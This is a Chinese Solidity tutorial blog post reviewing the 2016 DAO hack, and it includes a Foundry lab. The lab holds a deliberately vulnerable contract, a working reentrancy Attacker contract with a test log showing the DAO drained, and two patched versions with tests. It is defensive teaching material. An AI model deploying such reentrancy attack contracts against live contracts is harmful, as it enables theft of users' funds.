---
layout: post
title: 《纸上谈兵·solidity》第 28 课：智能合约安全审计案例复盘 -- The DAO Hack(2016)
tags: solidity
mermaid: false
math: false
---  

# The DAO Hack 简介

* **时间**：2016 年 6 月
* **事件**：一个基于以太坊的“去中心化投资基金”——The DAO，被黑客利用智能合约漏洞攻击，导致 **360 万 ETH**（当时约 5000 万美元）被盗。
* **影响**：直接导致以太坊社区分裂，产生了 **ETH（Ethereum）与 ETC（Ethereum Classic）** 两条链。

---

## 1. 背景

The DAO 是由 Slock.it 团队发起的一个智能合约，目标是让全球投资人通过 ETH 投资 DAO，然后社区投票决定投资哪些项目。

它的智能合约存放了 **1150 万 ETH**，约占当时以太坊流通量的 **14%**，是当时规模最大的智能合约资金池。

---

## 2. 技术漏洞

漏洞出在 **提款逻辑**（`splitDAO` 函数）中，存在一个典型的 **重入漏洞（Reentrancy Bug）**：

### ❌ 错误的逻辑顺序：

```solidity
function splitDAO(uint withdrawAmount) public {
    if (balances[msg.sender] >= withdrawAmount) {
        msg.sender.call.value(withdrawAmount)(); // 先转账（外部调用）
        balances[msg.sender] -= withdrawAmount;  // 再更新余额
    }
}
```

* 攻击者可以在 `msg.sender.call.value()` 时 **递归调用 splitDAO**，在余额尚未减少之前反复提款。
* 结果就是：合约里的资金被反复转出，直到被耗尽。

### ✅ 正确的做法（Checks-Effects-Interactions 模式）：

```solidity
function withdraw(uint withdrawAmount) public {
    require(balances[msg.sender] >= withdrawAmount);
    balances[msg.sender] -= withdrawAmount;  // 先更新余额
    payable(msg.sender).transfer(withdrawAmount); // 最后转账
}
```

---

## 3. 攻击过程

* 黑客部署了一个恶意合约，利用 **回调函数** 在收到 ETH 时再次调用 The DAO 的提款函数。
* 这样在 The DAO 记录攻击者余额前，已经多次转出了资金。
* 攻击持续了数小时，最终窃取了 **约 360 万 ETH**。

不过资金暂时被锁在攻击者控制的“子 DAO”中，需要 **28 天冷却期**才能转走。

---

## 4. 社区反应

### 方案讨论：

1. **不干预**：认为区块链是不可篡改的，应尊重“代码即法律”。
2. **软分叉**：冻结被盗资金，阻止攻击者提现（后来发现可能带来拒绝服务攻击风险）。
3. **硬分叉**：在链上回滚到攻击前状态，把资金退还给投资者。

### 结果：

以太坊社区最终选择 **硬分叉**。

* **Ethereum (ETH)**：采用硬分叉，追回资金。
* **Ethereum Classic (ETC)**：拒绝硬分叉，保留原链，资金攻击者依旧持有。

这次分裂也确立了两条链的不同价值观：

* **ETH**：务实，优先保障用户资金安全。
* **ETC**：坚持“代码不可篡改”。

---

## 5. 影响与启示

* 这是 **区块链历史上最著名的智能合约黑客事件**。
* 直接推动了以下最佳实践的普及：
  * **Checks-Effects-Interactions 模式**
  * **使用 pull payment 代替 push payment**
  * **ReentrancyGuard（重入锁）模式**
* 也让整个行业认识到：
  * **智能合约 = 代码即法律，但代码可能有 Bug**
  * **安全审计与形式化验证** 在 DeFi 中至关重要
  * **治理问题**：区块链的“不可篡改”原则 vs 社区干预的现实需要

---

## 6. The DAO Hack 攻击复现实验  

**合约文件：VulnerableDAO.sol**  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 漏洞版DAO合约 - 用于复现2016年DAO Hack
/// @notice 切勿在生产环境使用！
contract VulnerableDAO {
    mapping(address => uint256) public balances;

    /// @notice 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice 提款（存在重入漏洞）
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // 漏洞：先转账，再更新余额
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");

        balances[msg.sender] = 0;
    }

    /// @notice 查看合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**攻击合约文件：Attacker.sol**  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableDAO.sol";

/// @title 攻击合约 - 模拟DAO Hack
contract Attacker {
    VulnerableDAO public dao;
    address public owner;

    constructor(address _dao) {
        dao = VulnerableDAO(_dao);
        owner = msg.sender;
    }

    /// @notice 发起攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "need at least 1 ETH");
        dao.deposit{value: 1 ether}();
        dao.withdraw();
    }

    /// @notice 接收ETH并重入
    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw();
        }
    }

    /// @notice 提取盗得资金
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
```  

**测试文件：DAOHack.t.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableDAO.sol";
import "../src/Attacker.sol";

/// @title DAO Hack 攻击复现测试
contract DAOHackTest is Test {
    VulnerableDAO dao;
    Attacker attacker;
    address deployer = address(0xABCD);

    function setUp() public {
        vm.deal(deployer, 10 ether);
        vm.startPrank(deployer);
        dao = new VulnerableDAO();

        // 初始资金注入DAO
        dao.deposit{value: 5 ether}();
        vm.stopPrank();
    }

    function testAttack() public {
        // 给攻击者账户资金
        vm.deal(address(0xBEEF), 10 ether);

        // 以攻击者身份部署攻击合约
        vm.startPrank(address(0xBEEF));
        attacker = new Attacker(address(dao));

        // 发动攻击（msg.value 从 0xBEEF 支付）
        attacker.attack{value: 1 ether}();
        vm.stopPrank();

        emit log_named_uint("DAO Balance After", address(dao).balance);
        emit log_named_uint(
            "Attacker Balance After",
            address(attacker).balance
        );

        assertEq(address(dao).balance, 0, "DAO should be drained");
    }
}
```  

**测试结果：**  

```bash
➜  counter git:(main) ✗ forge test --match-path test/DAOHack.t.sol -vvv
[⠊] Compiling...
[⠒] Compiling 54 files with Solc 0.8.29
[⠘] Solc 0.8.29 finished in 1.54s
Compiler run successful!

Ran 1 test for test/DAOHack.t.sol:DAOHackTest
[PASS] testAttack() (gas: 487330)
Logs:
  DAO Balance After: 0
  Attacker Balance After: 6000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.38ms (486.01µs CPU time)

Ran 1 test suite in 455.20ms (1.38ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```  

### Checks-Effects-Interactions 模式修复

**修复版 DAO 合约：SafeDAO.sol**  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 安全版DAO合约 - 修复重入攻击漏洞
/// @notice 使用 Checks-Effects-Interactions 模式
contract SafeDAO {
    mapping(address => uint256) public balances;

    /// @notice 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice 提款（已修复重入漏洞）
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // ✅ 先更新余额，再转账
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
    }

    /// @notice 查看合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```  

**Attacker.sol 无需修改，测试文件：DAOHackFix.t.sol**  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableDAO.sol";
import "../src/Attacker.sol";
import "../src/SafeDAO.sol";

/// @title DAO Hack 攻击复现测试
contract DAOHackTest is Test {
    VulnerableDAO dao;
    Attacker attacker;
    SafeDAO safe;

    address deployer = address(0xABCD);
    address hacker = address(0xBEEF);

    function setUp() public {
        // 初始化两个DAO合约：一个有漏洞，一个修复了漏洞
        vm.deal(deployer, 20 ether);
        vm.startPrank(deployer);

        dao = new VulnerableDAO();
        safe = new SafeDAO();

        // 给两个DAO注入资金（5 ETH）
        dao.deposit{value: 5 ether}();
        safe.deposit{value: 5 ether}();

        vm.stopPrank();
    }

    function testAttack() public {
        // 给攻击者账户资金
        vm.deal(address(0xBEEF), 10 ether);

        // 以攻击者身份部署攻击合约
        vm.startPrank(address(0xBEEF));
        attacker = new Attacker(address(dao));

        // 发动攻击（msg.value 从 0xBEEF 支付）
        attacker.attack{value: 1 ether}();
        vm.stopPrank();

        emit log_named_uint("DAO Balance After", address(dao).balance);
        emit log_named_uint(
            "Attacker Balance After",
            address(attacker).balance
        );

        assertEq(address(dao).balance, 0, "DAO should be drained");
    }

    function test_Revert_When_AttackSafeDAO() public {
        attacker = new Attacker(address(safe));
        vm.deal(hacker, 1 ether);

        // 攻击前余额
        emit log_named_uint("Safe DAO Balance Before", address(safe).balance);

        // 尝试攻击修复版合约
        vm.prank(hacker);
        vm.expectRevert();
        attacker.attack{value: 1 ether}();

        // ✅ 攻击失败：DAO 余额仍然存在
        emit log_named_uint("Safe DAO Balance After", address(safe).balance);
        emit log_named_uint("Attacker Balance After", address(attacker).balance);

        assertEq(address(safe).balance, 5 ether, "DAO should be safe");
    }
}
```  

执行测试：  

```bash
➜  counter git:(main) ✗ forge test --match-path test/DAOHack.t.sol -vvv
[⠊] Compiling...
[⠘] Compiling 1 files with Solc 0.8.29
[⠃] Solc 0.8.29 finished in 1.71s
Compiler run successful!

Ran 2 tests for test/DAOHack.t.sol:DAOHackTest
[PASS] testAttack() (gas: 487264)
Logs:
  DAO Balance After: 0
  Attacker Balance After: 6000000000000000000

[PASS] test_Revert_When_AttackSafeDAO() (gas: 470861)
Logs:
  Safe DAO Balance Before: 5000000000000000000
  Safe DAO Balance After: 5000000000000000000
  Attacker Balance After: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.63ms (707.79µs CPU time)

Ran 1 test suite in 476.50ms (1.63ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```  

### 使用 ReentrancyGuard 的 DAO 合约

**使用 ReentrancyGuard 的 DAO 合约：GuardedDAO.sol** 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/// @title 带重入锁的DAO合约
/// @notice 使用 OpenZeppelin ReentrancyGuard 防御重入攻击
contract GuardedDAO is ReentrancyGuard {
    mapping(address => uint256) public balances;

    /// @notice 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice 提款（带 nonReentrant 修饰器）
    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // ✅ 这里即使写成“先转账后更新”，也不会被重入攻击
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");

        balances[msg.sender] = 0;
    }

    /// @notice 查看合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```    

**Attacker.sol 无需修改，测试文件：DAOHack.t.sol 新增以下内容**

```solidity
function test_Revert_When_AttackGuardedDAO() public {
    GuardedDAO guarded = new GuardedDAO();
    guarded.deposit{value: 5 ether}();

    attacker = new Attacker(address(guarded));
    vm.deal(hacker, 1 ether);

    // 攻击前余额
    emit log_named_uint("Guarded DAO Balance Before", address(guarded).balance);

    // 尝试攻击修复版合约
    vm.prank(hacker);
    vm.expectRevert();
    attacker.attack{value: 1 ether}();

    // ✅ 攻击失败：DAO 余额仍然存在
    emit log_named_uint("Guarded DAO Balance After", address(guarded).balance);
    emit log_named_uint("Attacker Balance After", address(attacker).balance);

    assertEq(address(guarded).balance, 5 ether, "DAO should be safe");
}
```

**执行测试：**

```bash
...

[PASS] test_Revert_When_AttackGuardedDAO() (gas: 475365)
Logs:
  Guarded DAO Balance Before: 5000000000000000000
  Guarded DAO Balance After: 5000000000000000000
  Attacker Balance After: 0

...
```

---

<div align="center">
  <img src="../img/qrcode_wechat.jpg" alt="孟斯特">
</div>

> 声明：本作品采用[署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)进行许可，使用时请注明出处。  
> Author: [mengbin](mengbin1992@outlook.com)  
> blog: [mengbin](https://mengbin.top)  
> Github: [mengbin92](https://mengbin92.github.io/)  
> 腾讯云开发者社区：[孟斯特](https://cloud.tencent.com/developer/user/6649301)  
---